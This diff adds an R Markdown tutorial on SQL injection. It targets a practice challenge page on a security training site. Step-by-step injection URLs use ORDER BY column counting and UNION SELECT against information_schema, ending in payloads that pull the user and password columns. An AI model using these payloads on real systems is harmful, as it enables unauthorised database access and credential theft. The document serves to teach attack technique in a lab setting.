@@ -1,0 +1,228 @@
+---
+title: "Error-based SQL Injection Guide"
+author: "Minh Nguyen"
+date: "October 12, 2015"
+output:
+  html_document:
+    highlight: zenburn
+    theme: united
+    toc: yes
+  pdf_document:
+    toc: yes
+---
+
+Target site:
+
+```url
+http://securityoverride.org/challenges/basic/12/index.php?id=1
+```
+
+Technique: Error-based SQL Injection
+
+Online-Database site:
+
+```url    
+http://www.w3schools.com/sql/trysql.asp?filename=trysql_select_union
+```
+
+###STEP 1. Test the injection.
+
+Add single quote to test the if the strings are properly sanitized.
+
+```url
+http://securityoverride.org/challenges/basic/12/index.php?id=1'
+```
+
+Nothing happened, let's try the other ways.
+
+###STEP 2. Check the number of columns.
+
+```SQL
+ORDER BY 1, 2, 3, 4
+```
+
+To complete this objective, you first need to learn how **ORDER** clause is executed. Let’s try to play around with our online database, type:
+
+```sql
+SELECT * FROM categories order by 1
+SELECT * FROM categories order by 2
+SELECT * FROM categories order by 3
+```
+
+| CategoryID  | CategoryName  | Description   |
+|---:|---:|---:|
+|  5  | Grains/Cereals   | Breads, crackers, pasta, and cereal   |
+|  4  | Dairy Products   | Cheeses   |
+| 3   |  Confections  | Desserts, candies, and sweet breads   |
+| 7   |  Produce  | Dried fruit and bean curd   |
+| ...|...|...|
+
+**Number of Records: 8**
+
+You see the order of displayed table will be sorted by corresponding column which its position is indicated by the number after **ORDER BY** clause. What if we try to order the table by 4th column?
+
+```url
+The Microsoft Jet database engine does not recognize '4' as a valid field name or expression.
+```
+
+It will immediately response with the error indicating that there is no column 4 : >. Now go and try this technique on our target site and try 1 till 5 see what you can get.
+
+```url
+Warning mysql_fetch_arry(): supplied argument is not vaild MySQL result resource in \challanges\basic\12\index.php
+```
+
+**Note** that you need to add ```-- -``` to common out the rest as follows:
+
+```url
+http://securityoverride.org/challenges/basic/12/index.php?id=1%20order%20by%205%20--%20-
+```
+
+After this step, we know that the table storing authenticated information consists of 4 columns.
+
+###STEP 3. Check the table name.
+
+Next target is to find the table name storing authenticated information. To achieve this goal, we use **UNION** clause. The **UNION** clause allows us to merge results set from different queries. Let’s try **UNION** clause on our online database:
+
+```SQL
+SELECT * FROM categories
+UNION
+SELECT * FROM products;
+```
+
+```url
+Error: The number of columns in the two selected tables or queries of a union query do not match.
+```
+
+Hmm, look like the two queries need to be matched in the returned number of columns.
+
+Since we already knew that the categories table has 3 columns, we can restrict the result of the the other query as follows:
+
+```SQL
+SELECT * FROM categories
+UNION
+SELECT productid, productname,unit from products;
+```
+
+| CategoryID  | CategoryName  | Description   |
+|---:|---:|---:|
+| 1  | Beverages   | Soft drinks, coffees, teas, beers, and ales   |
+|1  | Chais |10 boxes x 20 bags  |
+| 2 |Chang  |24 - 12 oz bottles  |
+|2  |Condiments  |Sweet and savory sauces, relishes, spreads, and seasonings  |
+| 3 |Aniseed Syrup  | 12 - 550 ml bottles |
+| 3 |Confections  |Desserts, candies, and sweet breads  |
+| ... | ... | ...|
+
+**Number of Records: 85**
+
+Sweet, we see that they are doing the union. The new table’s row will be equal to the sum of rows from *products* and *categories* : ). We can try something even more funky.
+
+```sql
+SELECT * FROM categories
+union
+select 1,2,3 from products;
+```
+| CategoryID  | CategoryName  | Description   |
+|---:|---:|---:|
+|1 | 2 | 3|
+|1  |Beverages  |Soft drinks, coffees, teas, beers, and ales  |
+| 2 |Condiments  |Sweet and savory sauces, relishes, spreads, and seasonings  |
+|3  |Confections  |Desserts, candies, and sweet breads  |
+|4  |Dairy Products  |Cheeses  |
+| 5 |Grains/Cereals  |Breads, crackers, pasta, and cereal  |
+
+Number of Records: 9
+
+
+What does ``` SELECT 1,2,3 FROM products``` return ?
+
+| Expr1000  | Expr1001  | Expr1002   |
+|---:|---:|---:|
+|1  | 2  | 3 |
+|1  | 2  | 3 |
+|1  | 2  | 3 |
+|1  | 2  | 3 |
+|1  | 2  | 3 |
+|... |... |... |
+
+Number of Records: 77
+
+Weird, but not, because you asked the server to return the first column of 1’s for every row in table Products. Similarly, SELECT 2 return the second column of 2’s for every row in table Products.
+The *Expr1000*, *Expr1001*, *Expr1002* are generic expressions since the server do not know the name of these newly created columns.
+Back to our case, the query below will actually ask server to union 3 columns of categories with 3 columns of products if there is a match on ID.
+
+For the *products* table, the first *Expr1000* is treated as ID column. For the categories table, the categoryID is treated as ID column. Since 1=1, we have a matched row. In addition, union does not allow duplication, so we only have 1 entry for Products table.
+
+What if we replace the column 2 with a legitimate column in products i.e productname ?
+
+```sql
+SELECT * FROM categories
+UNION
+SELECT 1,productname,3 FROM products;
+```
+
+| CategoryID  | CategoryName  | Description   |
+|---:|---:|---:|
+|1  | Alice Mutton  | 3 |
+|1 | Aniseed Syrup | 3.|
+|1.|Beverages |Soft drinks, coffees, teas, beers, and ales |
+|1.|Boston Crab Meat |3.|
+|1.|Camembert Pierrot |3.|
+
+Number of Records: 85
+
+Tadaaa, we have the value of the column instead of meaningless value.
+
+It is also important to note that if the number of rows of the first query is equal to **NULL**, **NULL** union with A = A. In order words, **NULL** union with an authenticated table = data from the authenticated table : ). But we do not know the table name ? We can look for it inside the *information_schema.tables*. The *information_schema.tables* is the table where our tables name of RDBMS are stored.
+
+```sql
+SELECT * FROM categories
+UNION
+SELECT 1,2,3 FROM information_schema.tables;
+```
+
+You cannot, however, execute the following sql due to several restrictions from Microsoft Jet Database. But you can try it on our target site. Previously, we knew that the number of columns is 4.
+We can craft our injecting query as follows:
+
+```url
+http://securityoverride.org/challenges/basic/12/index.php?id=-1%20union%20select%201,2,3,4%20from%20information_schema.tables%20--%20-
+```
+
+```sql
+Welcome user: 2,3,4frominformation_schema.tables--
+Email: 3,4frominformation_schema.tables--
+```
+###STEP 4. Exploit.
+*Pingo :>* . This actually show us nothing, By definition, you can look up all the table names under the **information_schema** database, **tables** table with the **table_name** column :>.
+
+```url
+http://securityoverride.org/challenges/basic/12/index.php?id=-1%20union%20select%201,table_name,3,4%20from%20information_schema.tables%20--%20-
+```
+
+```sql
+Welcome User: CHARACTER_SETS
+Email: admin@securityoverride.com
+Welcome User: COLLATIONS
+Email: admin@securityoverride.com
+Welcome User: COLLATION_CHARACTER_SET_APPLICABILLITY
+Email: admin@securityoverride.com
+Welcome User: COLUMNS
+Email: admin@securityoverride.com
+Welocme User: COLUMN_PRIVIEGES
+Email: admin@securityoverride.com
+Welcome User: TABLES
+Email: admin@securityoverride.com
+Welcome User: users
+Email: 3
+```
+
+What are stored in the here ? Of couse, the name of all tables you have created for this database session. And we see a table with the name user.
+Performing the same union technique to guess for the password and user on table users, the url should look like belows.
+
+```url
+http://securityoverride.org/challenges/basic/12/index.php?id=1%20union%20select%201,user,3,4%20from%20users%20--%20-
+
+http://securityoverride.org/challenges/basic/12/index.php?id=1%20union%20select%201,password,3,4%20from%20users%20--%20-
+```
+
+There is only 1 entry in the table. And it’s a result.
